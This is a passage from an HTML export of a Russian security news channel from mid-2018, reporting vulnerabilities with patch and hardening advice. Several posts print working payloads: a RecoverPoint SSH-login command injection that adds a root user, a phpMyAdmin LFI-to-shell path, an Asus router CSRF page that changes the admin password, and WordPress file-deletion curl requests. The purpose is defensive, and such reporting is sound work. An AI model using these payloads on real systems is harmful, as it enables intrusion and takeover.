<a href="" onclick="return ShowHashtag(&quot;web&quot;)">#web</a> <a href="" onclick="return ShowHashtag(&quot;tools&quot;)">#tools</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br><strong>Бесплатные SSL-сертификаты</strong><br><br>Ваш сайт все еще на голом HTTP? Некомильфо, ребята. Вон и Chrome такие сайты называет небезопасными. Да и вообще, в чем сложность то?<br><br>Вот <a href="https://letsencrypt.org">https://letsencrypt.org</a> предлагает бесплатные SSL-сертификаты, быстро и просто.<br><br>А если сайт на Apache или nginx на актуальной сборке линукса, то ВСЯ установка, выписка сертификата и настройка выглядит примерно так:<br><br><code>sudo apt-get update</code><br><code>sudo apt-get install software-properties-common</code><br><code>sudo add-apt-repository ppa:certbot/certbot</code><br><code>sudo apt-get update</code><br><code>sudo apt-get install python-certbot-nginx</code><br><code>sudo certbot --nginx</code><br><br>Он и редиректы на HTTPS сразу сам настроит, если вы согласитесь. Так что на выходе получаете уже рабочий сайт.<br><br>Вот тут можно посмотреть список поддерживаемых систем и найти команды для своей конфигурации: <a href="https://certbot.eff.org/">https://certbot.eff.org/</a>.
       </div>

      </div>

     </div>

     <div class="message service" id="message-163">

      <div class="body details">
5 June 2018
      </div>

     </div>

     <div class="message default clearfix" id="message181">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="05.06.2018 10:56:08">
10:56
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;приклад&quot;)">#приклад</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br><strong>Почему пора обновить Git?</strong><br><br>RCE в Git. Не то, чтобы ща прям всех заэксплойтят: чтобы ее триггернуть, нужно подгружать подмодули (submodules) проектов. Ну а для эксплуатации нужно создать проект с вредоносными submodules. Немного подделки путей, полезная нагрузка пойдет в виде простого, скажем Bash, скрипта. Вот тут очень подробно объясняется, как это сделать: <a href="https://staaldraad.github.io/post/2018-06-03-cve-2018-11235-git-rce/">https://staaldraad.github.io/post/2018-06-03-cve-2018-11235-git-rce/</a>.<br><br>Патчи добавлены в версиях 2.17.1, 2.16.4, 2.15.2, 2.14.4, 2.13.7. Клиентскую сторону достаточно просто пропатчить. А на серверной появляется опция transfer.fsckObjects, блокирующая работу с вредоносными submodules. По дефолту она отключена, так что надо активировать.<br><br>Проверить уязвимость своей версии можно очень просто, во временной директории выполнить:<br><br><code>git init test &amp;&amp; cd test &amp;&amp; git update-index --add --cacheinfo 120000,e69de29bb2d1d6434b8b29ae775ad8c2e48c5391,.gitmodules</code><br><br>&quot;Хороший&quot; ответ от пропатченной версии:<br><br><code>error: Invalid path &apos;.gitmodules&apos;</code><br><code>fatal: git update-index: --cacheinfo cannot add .gitmodules</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-164">

      <div class="body details">
6 June 2018
      </div>

     </div>

     <div class="message default clearfix" id="message182">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="06.06.2018 10:53:03">
10:53
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;майнеры&quot;)">#майнеры</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a><br><br>Да, уязвимость в Linux Kernel от 4.13 до 4.16.11 (<a href="https://www.securityfocus.com/bid/104291">https://www.securityfocus.com/bid/104291</a>), да, эксплойты для дыр в ядре macOS/iOS (<a href="https://packetstormsecurity.com/files/148062/GS20180606003712.tgz">https://packetstormsecurity.com/files/148062/GS20180606003712.tgz</a>, <a href="https://packetstormsecurity.com/files/148060/GS20180606003305.tgz">https://packetstormsecurity.com/files/148060/GS20180606003305.tgz</a>), но это же все скучно.<br><br>Совсем другое дело сеженькие эксплойты для майнеров. Главные герои - cgminer версии 4.10.0 и ниже и bfgminer версии 5.5.0 и ниже. <a href="https://github.com/tintinweb/pub/tree/master/pocs/cve-2018-10058">https://github.com/tintinweb/pub/tree/master/pocs/cve-2018-10058</a>, <a href="https://github.com/tintinweb/pub/tree/master/pocs/cve-2018-10057">https://github.com/tintinweb/pub/tree/master/pocs/cve-2018-10057</a>. Маловато пока.
       </div>

      </div>

     </div>

     <div class="message service" id="message-165">

      <div class="body details">
7 June 2018
      </div>

     </div>

     <div class="message default clearfix" id="message183">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="07.06.2018 10:48:58">
10:48
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;приклад&quot;)">#приклад</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br><strong>Zip Slip</strong><br><br>Ну вы бы точно не пропустили path traversal в своем коде. А вот разработчики многих проектов, даже очень широко используемых, как ни удивительно, это сделали. В результате при распаковке архивов путь файла, содержащий &apos;..&apos;, обрабатывается как он есть. И можно затереть файлы вне директории распаковки. А дальше там подмена бинарей, например...<br><br>Уязвимых проектов выявлено &quot;много&quot;. Вот тут список с указанием наличия исправленных версий: <a href="https://github.com/snyk/zip-slip-vulnerability">https://github.com/snyk/zip-slip-vulnerability</a>. Надо просмотреть и обновить соответствующий софт. Если обновлений пока нет - проводить предварительную проверку открываемых архивов.<br><br>Ну и вайтпейпер уязвимости (там в основном примеры уязвимого кода): <a href="https://res.cloudinary.com/snyk/image/upload/v1528192501/zip-slip-vulnerability/technical-whitepaper.pdf">https://res.cloudinary.com/snyk/image/upload/v1528192501/zip-slip-vulnerability/technical-whitepaper.pdf</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-166">

      <div class="body details">
9 June 2018
      </div>

     </div>

     <div class="message default clearfix" id="message184">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="09.06.2018 11:43:28">
11:43
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;камеры&quot;)">#камеры</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br><strong>RCE в камерах Foscam</strong><br><br>В камерах Foscam наблюдается ряд уязвимостей, которые приводят к выполнению произвольных команд с правами root. <br><br>Уязвимость 1 - CVE-2018-6830 - удаление произвольного файла. Можно использовать для удаления файла с кредами администратора.<br>Уязвимость 2 - CVE-2018-6832 - переполнение буфера в стеке процесса webService. Можно и RCE наклепать, но в данном случае используется просто чтобы ребутнуть процесс. После ребута креды админа обнуляются, так как они удалены, и можно зайти без пароля.<br>Уязвимость 3 - CVE-2018-6831 - внедрение команд ОС, требует авторизации, но после эксплуатации 1 и 2 это уже не проблема.<br><br>Подробный гайд, почему, как и что с этим делать, от ресечеров: <a href="https://blog.vdoo.com/2018/06/06/vdoo-has-found-major-vulnerabilities-in-foscam-cameras/">https://blog.vdoo.com/2018/06/06/vdoo-has-found-major-vulnerabilities-in-foscam-cameras/</a><br><br>Перечень уязвимых 55 моделей и версий тоже тут: <a href="https://blog.vdoo.com/2018/06/06/vdoo-has-found-major-vulnerabilities-in-foscam-cameras/">https://blog.vdoo.com/2018/06/06/vdoo-has-found-major-vulnerabilities-in-foscam-cameras/</a><br><br>Ну и обновления производитель выпустил, осталось только их установить.
       </div>

      </div>

     </div>

     <div class="message service" id="message-167">

      <div class="body details">
14 June 2018
      </div>

     </div>

     <div class="message default clearfix" id="message185">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="14.06.2018 10:37:17">
10:37
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;windows&quot;)">#windows</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br><strong>Отключаем WDigest</strong><br><br>Начиная с XP в виндах есть провайдер аутентификации WDigest, который используется для прозрачного введения паролей в HTTP и SASL приложениях. И хранит это чудо пароли в оперативной памяти (процесса lsass) в открытом виде. Откуда взломщику порой не составляет труда их достать.<br><br>Отсюда возникает мастхевная настройка для отключения хранения паролей в открытом виде:<br><br><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0</code><br><br>Понятно, что стоит ее включить в доменную политику. И надо иметь в виду, что взломщик может и перенастроить этот параметр, если уж у него есть доступ к системе.<br><br>И да - на Win 7, 8, 2008 R2, 2012, чтобы отключение работало, требуется установить KB2871997.
       </div>

      </div>

     </div>

     <div class="message service" id="message-168">

      <div class="body details">
15 June 2018
      </div>

     </div>

     <div class="message default clearfix" id="message186">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="15.06.2018 10:48:50">
10:48
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;windows&quot;)">#windows</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br><strong>Удаляем креды после логоффа</strong><br><br>И в продолжение истории: ключ TokenLeakDetectDelaySecs. Он позволяет включить проверку наличия и удаление кредов разлогинившихся пользователей из памяти lsass. В 8.1 и 10 это настройка по умолчанию, но для более ранних версий требуется установить вручную. После установки того же KB2871997.<br><br><code>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v TokenLeakDetectDelaySecs /t REG_DWORD /d 30</code><br><br>Либо, после установки KB3126593 очистка включится автоматически.<br><br>Опять же, как и UseLogonCredential, ключ TokenLeakDetectDelaySecs достоин мониторинга на изменение на 0 - никому это не понадобится, кроме упорного взломщика.
       </div>

      </div>

     </div>

     <div class="message service" id="message-169">

      <div class="body details">
19 June 2018
      </div>

     </div>

     <div class="message default clearfix" id="message187">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="19.06.2018 06:12:20">
06:12
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;network&quot;)">#network</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br><strong>День защиты домашнего роутера</strong><br><br>Набралось уже более 70 моделей роутеров (список ниже), подверженных заражению VPNFilter. Экспертами пока не замечено, чтобы для заражения использовались зиродеи, так что происходит оно через известные уязвимости. С одной стороны, это позволяет с неплохой такой гарантией защититься, с другой - список уязвимых устройств может и пополниться другими, имеющими уязвимостями. В любом случае это отличный момент, чтобы обновить домашний роутер.<br><br>Свежую прошивку рекомендуется предварительно скачать себе, а уже потом, отключив роутер от интернета, обновлять.<br><br>Кроме обновления нужно проверить:<br>- не включен ли доступ к административным сервисам из интернета<br>- не включены ли лишние сервисы (Telnet, Ping, FTP, SMB, UPnP, WPS, удаленный доступ к NAS)<br>- не настроен ли ненужный проброс портов<br>- сменить пароль<br><br><strong>Asus:</strong> RT-AC66U, RT-N10, RT-N10E, RT-N10U, RT-N56U, RT-N66U<br><br><strong>D-Link:</strong> DES-1210-08P, DIR-300, DIR-300A, DSR-250N, DSR-500N, DSR-1000, DSR-1000N<br><br><strong>Huawei:</strong> HG8245<br><br><strong>Linksys:</strong> E1200, E2500, E3000, E3200, E4200, RV082, WRVS4400N<br><br><strong>Mikrotik</strong> (уязвимость устранена в RouterOS 6.38.5): CCR1009, CCR1016, CCR1036, CCR1072, CRS109, CRS112, CRS125, RB411, RB450, RB750, RB911, RB921, RB941, RB951, RB952, RB960, RB962, RB1100, RB1200, RB2011, RB3011, RB Groove, RB Omnitik, STX5<br><br><strong>Netgear:</strong> DG834, DGN1000, DGN2200, DGN3500, FVS318N, MBRN3000, R6400, R7000, R8000, WNR1000, WNR2000, WNR2200, WNR4000, WNDR3700, WNDR4000, WNDR4300, WNDR4300-TN, UTM50<br><br><strong>QNAP:</strong> TS251, TS439 Pro, NAS с QTS<br><br><strong>TP-Link:</strong> R600VPN, TL-WR741ND, TL-WR841N<br><br><strong>Ubiquiti:</strong> NSM2, PBE M5<br><br><strong>UPVEL:</strong> некоторые<br><br><strong>ZTE:</strong> ZXHN H108N
       </div>

      </div>

     </div>

     <div class="message service" id="message-170">

      <div class="body details">
21 June 2018
      </div>

     </div>

     <div class="message default clearfix" id="message188">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="21.06.2018 10:46:30">
10:46
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;mail&quot;)">#mail</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br><strong>Раскрытие перечня сотрудников</strong><br><br>Многие SMTP-сервера &quot;случайно&quot; раскрывают адреса пользователей. Это и вообще не особо то хорошо, но если у вас OWA доступна снаружи, то вообще становится проблемой.<br><br>Допустим, адрес сервера <a href="mx.example.ru">mx.example.ru</a> (если вы забыли свои адреса, то  &quot;<code>nslookup -type=MX yourdomain.ru</code>&quot; поможет)<br><br>Проверяем, есть ли проблемка:<br><br><code>telnet mx.example.ru 25</code><br><code>server: 220 mx.example.ru ESMTP</code><br><code>client: ehlo test.example.ru</code><br><code>server: 250 mx.example.com</code><br><code>client: mail from:&lt;admin@example.ru&gt;</code><br><code>server: 250 sender &lt;admin@example.ru&gt; ok</code><br><code>client: rcpt to:&lt;sovershennotochnonesuschestvyuschiiaddress@example.ru&gt;</code><br><code>server: 550 Address rejected.</code><br><code>client: rcpt to:&lt;knownaddress@example.ru&gt;</code><br><code>server: 250 recipient &lt;knownaddress@example.ru&gt; ok</code><br><br>По ответу сервера 250 или 550 можно определить, существует ли адрес. Также можно использовать скрипт smtp-user-enum, который входит, например, в состав Kali, а также легко поддается доработке.<br><br>Ну а правильно настроенный сервер должен отвечать одинаково на запросы к любым адресам из своего домена.
       </div>

      </div>

     </div>

     <div class="message service" id="message-171">

      <div class="body details">
22 June 2018
      </div>

     </div>

     <div class="message default clearfix" id="message189">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="22.06.2018 10:47:35">
10:47
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;приклад&quot;)">#приклад</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br><strong>RCE через имя пользователя</strong><br><br>Вообще то такого конечно не бывает, но...<br><br>Очаровательнейшая уязвимость в Dell EMC RecoverPoint до 5.1.2 - OS Command Injection в логине при аутентификации (CVE-2018-1235). То есть примерно так для удаленного варианта:<br><br><code>$ ssh &apos;$(useradd -ou0 -g0 bao7uo -p`openssl passwd -1 Secret123</code>)&apos;@192.168.57.3`<br><code>Password: ^C</code><br><code>$ ssh bao7uo@192.168.57.3</code><br><code>Password: Secret123</code><br><code>Could not chdir to home directory /home/bao7uo: No such file or directory</code><br><code>root@recoverpoint:/# id</code><br><code>uid=0(root) gid=0(root) groups=0(root)</code><br><br>Или же локальный:<br><br><code>recoverpoint login: $(bash &gt; &amp;2)</code><br><code>root@recoverpoint:/# id</code><br><code>uid=0(root) gid=0(root) groups=0(root)</code><br><br>Разработчики устраняли, устраняли (с февраля) и устранили. Версия 5.1.2 &quot;чиста&quot;, подробнее <a href="https://support.emc.com/kb/521234">https://support.emc.com/kb/521234</a>. Вместе с CVE-2018-1235 исправлено еще несколько тоже весьма симпатичных, но не таких серьезных уязвимостей.
       </div>

      </div>

     </div>

     <div class="message service" id="message-172">

      <div class="body details">
25 June 2018
      </div>

     </div>

     <div class="message default clearfix" id="message190">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="25.06.2018 10:13:52">
10:13
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;приклад&quot;)">#приклад</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br><strong>LFI в phpMyAdmin</strong><br><br>В недавно вышедшей версии 4.8.2 phpMyAdmin пофикшена уязвимость включения произвольных файлов на сервере (CVE-2018-12613). Дас ист вектор:<br><br><code>http://127.0.0.1/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../windows/wininit.ini</code><br><br>Без паники, для использования требуется авторизация (кроме случая с небезопасными настройками сервера &quot;$cfg[&apos;AllowArbitraryServer&apos;] = true&quot; или &quot;$cfg[&apos;ServerDefault&apos;] = 0&quot;). <br><br>Однако ж авторизованный пользователь может себе шелл запустить, например так:<br><br>Запрос к СУБД <code>select &apos;&lt;?php phpinfo();exit;?&gt;&apos;</code><br>Затем включение сессионного файла <code>http://example.com/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k</code><br><br>Так что phpMyAdmin 4.8 ветки рекомендуется обновить <a href="https://www.phpmyadmin.net/files/4.8.2/">https://www.phpmyadmin.net/files/4.8.2/</a>.
       </div>

      </div>

     </div>

     <div class="message service" id="message-173">

      <div class="body details">
27 June 2018
      </div>

     </div>

     <div class="message default clearfix" id="message191">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="27.06.2018 12:48:52">
12:48
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;csrf&quot;)">#csrf</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br><strong>На CSRF не попадемся</strong><br><br>А в AsusWRT RT-AC750GF CSRF, которая позволяет сменить пароль админа, следующего вида:<br><br><code>&lt;html&gt;</code><br><code>&lt;body&gt;</code><br><code>&lt;form action=&quot;http://router.asus.com/findasus.cgi&quot; method=&quot;POST&quot;&gt;</code><br><code>&lt;input type=&quot;hidden&quot; name=&quot;action_mode&quot; value=&quot;refresh_networkmap&quot; /&gt;</code><br><code>&lt;input type=&quot;text&quot; id=&quot;current_page&quot; name=&quot;current_page&quot; value=&quot;&quot; /&gt;</code><br><code>&lt;script&gt;</code><br><code>// set username at admin</code><br><code>// set password at admin123</code><br><code>// enable ssh daemon</code><br><code>document.getElementById(&quot;current_page&quot;).value = &quot;start_apply.htm?productid=RT-AC53&amp;current_page=Advanced_System_Content.asp&amp;next_page=Advanced_System_Content.asp&amp;modified=0&amp;action_mode=apply&amp;action_wait=5&amp;action_script=restart_time%3Brestart_upnp&amp;http_username=admin&amp;http_passwd=admin123&amp;http_passwd2=admin123&amp;v_password2=admin123&amp;sshd_enable=1&amp;sshd_port=22&amp;sshd_pass=1&amp;sshd_authkeys=&quot;;</code><br><code>&lt;/script&gt;</code><br><code>&lt;input type=&quot;submit&quot; value=&quot;&quot; /&gt;</code><br><code>&lt;/form&gt;</code><br><code>&lt;/body&gt;</code><br><code>&lt;/html&gt;</code><br>(подробности <a href="https://www.exploit-db.com/exploits/44937">https://www.exploit-db.com/exploits/44937</a>)<br><br>Можно грешить на отсутствие токенов в прошивке, постоянно мониторить новые дыры и обновления. Но вообще то ничто не мешает держать сессии на внутренних ресурсах в отдельном браузере. А по интернетику лазать - в другом, который установлен как браузер по умолчанию. А если сессии не нужны - закрывать. Например, за последние дни ту же проблему (создание админа через CSRF) нашли еще и в нескольких продуктах Ecessa и Intex Router N-150.
       </div>

      </div>

     </div>

     <div class="message service" id="message-174">

      <div class="body details">
28 June 2018
      </div>

     </div>

     <div class="message default clearfix" id="message192">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="28.06.2018 09:10:31">
09:10
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;приклад&quot;)">#приклад</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;заплатка&quot;)">#заплатка</a><br><br><strong>Лечим WordPress</strong><br><br>Вы, может быть, уже слышали - в ядре WordPress (4.9.6 и ниже) уязвимость, позволяющая удалить любой файл на сервере. Естественно, с правами WordPress. И удаляющему нужны права на создание/изменение и удаление публикаций (роль - Автор). Далее удаление:<br><br><code>curl -v &apos;http://localhost/wp-admin/post.php?post=4&apos; -H &apos;Cookie: ***&apos; -d &apos;action=editattachment&amp;_wpnonce=***&amp;thumb=../../../../wp-config.php&apos;</code> - привязка нужного файла к thumb публикации<br><br><code>curl -v &apos;http://localhost/wp-admin/post.php?post=4&apos; -H &apos;Cookie: ***&apos; -d &apos;action=delete&amp;_wpnonce=***&apos;</code> - удаление публикации вместе с &quot;thumb&quot;<br><br>В этом примере удаляется файл wp-config.php, после чего WordPress запустит установку себя с нуля через веб-интерфейс и потребует новые креды. Ваш &quot;Автор&quot; станет админом.<br><br>4.9.6 - текущая версия и патча производители не выпустили. Зато ресечеры предложили свою заплатку - добавить в файл functions.php используемой темы следующие несколько строк, которые обрезают путь thumb до последнего элемента (это может вызвать трудности с их расположением):<br><br><code>add_filter( &apos;wp_update_attachment_metadata&apos;, &apos;rips_unlink_tempfix&apos; );</code><br><code>function rips_unlink_tempfix( $data ) {</code><br><code>    if( isset($data[&apos;thumb&apos;]) ) {</code><br><code>        $data[&apos;thumb&apos;] = basename($data[&apos;thumb&apos;]);</code><br><code>    }</code><br><code>   return $data;</code><br><code>}</code><br><br>Или вариант в виде плагина: <a href="https://github.com/kkarpieszuk/rips_hotfix/releases/tag/0.1">https://github.com/kkarpieszuk/rips_hotfix/releases/tag/0.1</a>. На свой страх и риск.<br><br>Оригинальная статья ресечеров по уязвимости: <a href="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/">https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-175">

      <div class="body details">
3 July 2018
      </div>

     </div>

     <div class="message default clearfix" id="message193">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="03.07.2018 10:15:47">
10:15
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;vmware&quot;)">#vmware</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br>Опубликовали эксплойт для относительно свежей уязвимости в VMware NSX SD-WAN Edge (CVE-2018-6961). Дыра позволяет выполнять произвольные команды при доступе к локальному веб-интерфейсу без аутентификации.<br><br>Собственно эксплойт: <a href="https://www.exploit-db.com/exploits/44959/">https://www.exploit-db.com/exploits/44959/</a><br><br>Проблема актуальна для версий 2.х всех, 3.1.1 и ниже. В 3.1.2 включено исправление. Либо же можно просто отключить веб GUI.<br><br>И сдержанная, но достаточная реакция VMware со всякими ссылочками: <a href="https://www.vmware.com/security/advisories/VMSA-2018-0011.html">https://www.vmware.com/security/advisories/VMSA-2018-0011.html</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-176">

      <div class="body details">
5 July 2018
      </div>

     </div>

     <div class="message default clearfix" id="message194">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="05.07.2018 11:30:25">
11:30
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;network&quot;)">#network</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br><strong>Пока гром не грянет</strong><br><br>Если Асу не обновить, то теперь и проблем схлопотать можно. Для уязвимости CVE-2018-0296 в Cisco ASA и Firepower Threat Defense опубликовали эксплойты, можно Path Traversal получить, а можно - DoS. Всяко неприятно.<br><br>Апдейты то Cisco еще раньше выпустила (<a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180606-asaftd">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180606-asaftd</a>):<br><br>ветка 9.1 ASA - <a href="9.1.7.29">9.1.7.29</a><br>ветка 9.2 ASA - <a href="9.2.4.33">9.2.4.33</a><br>ветка 9.4 ASA - <a href="9.4.4.18">9.4.4.18</a><br>ветка 9.6 ASA - <a href="9.6.4.8">9.6.4.8</a><br>ветка 9.7 ASA - <a href="9.7.1.24">9.7.1.24</a><br>ветка 9.8 ASA - <a href="9.8.2.28">9.8.2.28</a><br>ветка 9.9 ASA - <a href="9.9.2.1">9.9.2.1</a><br>ветки 9.3, 9.5 и до 9.1 не поддерживаются<br><br>ветка 6.1.0 FTD - применить <a href="Cisco_FTD_SSP_Hotfix_EI-6.1.0.7-2.sh">Cisco_FTD_SSP_Hotfix_EI-6.1.0.7-2.sh</a> (для 41xx и 9300) или <a href="Cisco_FTD_Hotfix_EI-6.1.0.7-2.sh">Cisco_FTD_Hotfix_EI-6.1.0.7-2.sh</a> (для остальных)<br>ветка 6.2.0 FTD - вообще не содержит уязвимости<br>ветка 6.2.2 - <a href="6.2.2.3">6.2.2.3</a><br>ветка 6.2.3 - <a href="6.2.3.1">6.2.3.1</a>, или 6.2.3-85 (для Microsoft Azure Cloud), или 6.2.3-85.0 (для AWS Cloud)<br>ветки 6.2.1 и до 6.1 не поддерживаются<br><br>По такому случаю Cisco даже тем, у кого подписки нет, апдейт обещает - по серийному номеру и ссылке на описание уязвимости, отправлять на <a href="https://www.cisco.com/c/en/us/support/web/tsd-cisco-worldwide-contacts.html">https://www.cisco.com/c/en/us/support/web/tsd-cisco-worldwide-contacts.html</a>.<br><br>Ну и собственно один из вариантов эксплойта: <a href="https://github.com/yassineaboukir/CVE-2018-0296">https://github.com/yassineaboukir/CVE-2018-0296</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-177">

      <div class="body details">
9 July 2018
      </div>

     </div>

     <div class="message default clearfix" id="message195">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="09.07.2018 11:08:08">
11:08
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;hp&quot;)">#hp</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br><strong>HPE VAN SDN Remote Root - что делать</strong><br><br>В HP Enterprise VAN SDN наблюдается возможность удаленно без аутентификации получить доступ с правами рута. Главная проблема - вшитые креды. Вторая - ошибки в реализации sudo, которые позволяют повысить права. Уязвимость нашли в версии 2.7.18.0503. А еще можно заставить устройство непрерывно перезагружаться.<br><br>Эксплойт есть: <a href="https://korelogic.com/Resources/Advisories/KL-001-2018-008.txt">https://korelogic.com/Resources/Advisories/KL-001-2018-008.txt</a> и даже удостоен стать модулем метасплойта: <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/hp_van_sdn_cmd_inject.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/hp_van_sdn_cmd_inject.rb</a><br><br>А вот обновлением в данном случае не отделаешься. HP предоставила рекомендации по устранению, которые надо выполнять ручками:<br><br>1. Зайти на <code>http://&lt;controller_IP&gt;:/8443/sdu/ui</code> под учеткой <code>sdn</code><br><br>2. Configurations-&gt;System, выбрать компонент <code>com.hp.sdn.adm.auth.impl.AuthenticationManager</code><br><br>3. Жать Modify и заменить дефолтные значения <code>AdminToken</code> (Keystone admin token), <code>ServiceToken</code>, <code>KeystorePass</code> и <code>TruststorePass</code> на новые. Для Keystone 